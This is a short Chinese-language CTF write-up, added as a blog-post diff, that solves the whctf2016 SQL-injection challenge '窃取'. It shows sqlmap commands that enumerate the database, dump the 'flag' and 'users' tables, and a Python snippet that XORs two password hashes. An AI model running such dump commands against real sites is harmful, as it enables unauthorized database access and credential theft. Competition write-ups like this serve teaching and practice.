@@ -1,0 +1,59 @@
+---
+layout:     post
+title:      "whctf2016-web-窃取"
+date:       2016-05-29 14:30:00
+category:   writeup
+tag:        whctf2016
+---
+# 题目信息
+
+`score: 200` `type:web sql` `source: whctf2016`
+
+[知识点:sqlmap用户手册](http://drops.wooyun.org/tips/143)
+
+[个人收集](http://ctf.a306.xyz:8001/whctf/qiequ/)
+
+## 描述
+
+好像是一篇文章。给了四个链接，点击分别显示文章内容
+
+![](whctf2016-qiequ-1.png)
+
+# 题解
+
+直接sqlmap跑一下，主要就是参数的使用
+
+## 查看数据库结构
+
+`sqlmap -u http://ctf.a306.xyz:8001/whctf/qiequ/index.php?id=1 --schema --exclude-sysdbs`
+
+![](whctf2016-qiequ-2.png)
+
+## 查看表结构
+
+有两个表名为flag，最可疑，查看他们
+
+`sqlmap -u http://ctf.a306.xyz:8001/whctf/qiequ/index.php?id=1 --dump -T "flag"`
+
+![](whctf2016-qiequ-3.png)
+
+`sqlmap -u http://ctf.a306.xyz:8001/whctf/qiequ/index.php?id=1 --dump -D "wh_ct4_hgduyingjkhjhjg" -T "flag"`
+
+![](whctf2016-qiequ-4.png)
+
+得知答案为异或user表中的字段
+
+`sqlmap -u http://ctf.a306.xyz:8001/whctf/qiequ/index.php?id=1 --dump -T "users"`
+
+![](whctf2016-qiequ-5.png)
+
+发现其中admin的密码md5解密后为`qwer`，提交答案不对，猜测是user1和user2的密码经过异或再md5解密
+
+## py
+
+```
+s1 = 0x8FC63BC4337CD4B5F70577118BB69FE8
+s2 = 0x6a3fba70c97c880679a740669ddd5ca3
+s3 = s1^s2
+print hex(s3)
+```
